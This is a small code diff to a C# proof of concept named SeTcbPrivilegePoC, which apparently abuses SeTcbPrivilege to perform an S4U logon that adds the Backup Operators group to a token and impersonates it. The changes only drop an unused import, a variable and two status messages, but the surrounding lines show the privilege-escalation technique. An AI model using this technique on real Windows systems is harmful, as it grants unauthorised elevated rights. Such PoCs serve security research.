@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Security.Principal;
 using System.Text;
 using System.Runtime.InteropServices;
@@ -773,14 +772,12 @@ namespace SeTcbPrivilegePoC
 
         static void Main()
         {
-            int error;
             bool status;
             IntPtr hS4uToken;
             var groupSids = new string[]{ BACKUP_OPERATORS_SID };
 
             Console.WriteLine("[*] If you have SeTcbPrivilege, you can perform S4U Logon.");
             Console.WriteLine("[*] This PoC try to perform S4U Logon and add \"Builtin\\Backup Operators\" to current token group.");
-            Console.WriteLine("[>] Trying to perform S4U Logon.");
 
             hS4uToken = GetMsvS4uLogonToken(
                 Environment.UserName,
@@ -791,8 +788,6 @@ namespace SeTcbPrivilegePoC
 
             if (hS4uToken == IntPtr.Zero)
                 return;
-
-            Console.WriteLine("[>] Trying to apply S4U Logon token to current thread.");
 
             status = ImpersonateThreadToken(hS4uToken);
             LsaClose(hS4uToken);
